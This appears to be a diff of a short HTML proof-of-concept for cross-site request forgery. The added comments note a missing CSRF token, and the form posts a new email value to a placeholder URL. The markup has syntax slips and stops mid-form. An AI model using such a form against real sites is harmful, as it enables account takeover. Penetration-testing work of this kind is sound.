@@ -1,4 +1,10 @@
 <html>
+
+#
+#  As it is an authenticated action and after inspecting the headers there's no CSRF token, PoC can be attempted.
+#  Basically it will load and perform the action provided, on this sample, update form.
+#
+
 <body>
 <form action="URL" method"POST">
 <input type="text" name="email" value"NEW_VALUE">
